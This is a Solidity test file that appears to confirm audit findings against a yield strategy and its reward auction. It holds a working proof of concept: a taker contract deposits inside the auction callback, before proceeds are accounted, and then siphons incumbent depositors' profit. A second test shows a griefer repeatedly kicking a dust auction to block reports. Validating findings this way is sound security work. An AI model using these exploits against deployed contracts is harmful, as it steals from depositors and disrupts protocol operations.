// SPDX-License-Identifier: UNLICENSED
pragma solidity 0.8.28;

import {Setup, ERC20, IStrategyInterface} from "src/test/utils/Setup.sol";
import {Auction} from "@periphery/Auctions/Auction.sol";
import {ITaker} from "@periphery/interfaces/ITaker.sol";

contract AtomicAuctionTaker is ITaker {
    ERC20 public immutable asset;
    IStrategyInterface public immutable strategy;
    Auction public immutable auction;

    constructor(ERC20 _asset, IStrategyInterface _strategy, Auction _auction) {
        asset = _asset;
        strategy = _strategy;
        auction = _auction;

        _asset.approve(address(_strategy), type(uint256).max);
        _asset.approve(address(_auction), type(uint256).max);
    }

    function execute(address rewardToken, uint256 depositAmount) external {
        auction.take(rewardToken, type(uint256).max, address(this), abi.encode(depositAmount));
    }

    function auctionTakeCallback(address, address, uint256, uint256, bytes calldata data) external {
        require(msg.sender == address(auction), "!auction");
        strategy.deposit(abi.decode(data, (uint256)), address(this));
    }

    function redeemAll() external returns (uint256 assets) {
        assets = strategy.redeem(strategy.balanceOf(address(this)), address(this), address(this));
    }
}

contract AuditValidationTest is Setup {
    function test_atomicAuctionCallbackMintsBeforeProceedsAreAccounted() public {
        uint256 incumbentDeposit = 1_000_000e18;
        uint256 attackerDeposit = 1_000_000e18;
        uint256 rewardLot = 100_000e18;

        mintAndDepositIntoStrategy(strategy, user, incumbentDeposit);
        airdrop(ERC20(strategy.REWARDS_TOKEN()), address(strategy), rewardLot);

        vm.prank(keeper);
        strategy.report();

        uint256 proceeds = auction.getAmountNeeded(strategy.REWARDS_TOKEN());
        assertGt(proceeds, 0, "!proceeds");

        AtomicAuctionTaker taker = new AtomicAuctionTaker(asset, strategy, auction);
        airdrop(asset, address(taker), attackerDeposit + proceeds);
        taker.execute(strategy.REWARDS_TOKEN(), attackerDeposit);

        assertEq(strategy.balanceOf(address(taker)), attackerDeposit, "shares priced after proceeds");
        assertEq(strategy.totalAssets(), incumbentDeposit + attackerDeposit, "proceeds unexpectedly accounted");
        assertEq(strategy.balanceOfAsset(), proceeds, "auction proceeds not received");

        vm.prank(keeper);
        (uint256 profit,) = strategy.report();
        assertEq(profit, proceeds, "auction proceeds not reported as profit");

        skip(strategy.profitMaxUnlockTime() + 1);
        uint256 redeemed = taker.redeemAll();
        assertGt(redeemed, attackerDeposit, "callback depositor captured no incumbent profit");
    }

    function test_permissionlessDustAuctionCanRepeatedlyBlockReport() public {
        address rewardToken = strategy.REWARDS_TOKEN();
        uint256 reportableRewards = strategy.minAmountToSell(rewardToken) + 1;

        airdrop(ERC20(rewardToken), address(strategy), reportableRewards);
        airdrop(ERC20(rewardToken), address(auction), 1);

        address griefer = address(0xBEEF);
        vm.prank(griefer);
        auction.kick(rewardToken);

        vm.prank(keeper);
        vm.expectRevert("too soon");
        strategy.report();

        skip(auction.auctionLength() + 1);
        vm.prank(griefer);
        auction.kick(rewardToken);

        vm.prank(keeper);
        vm.expectRevert("too soon");
        strategy.report();
    }
}
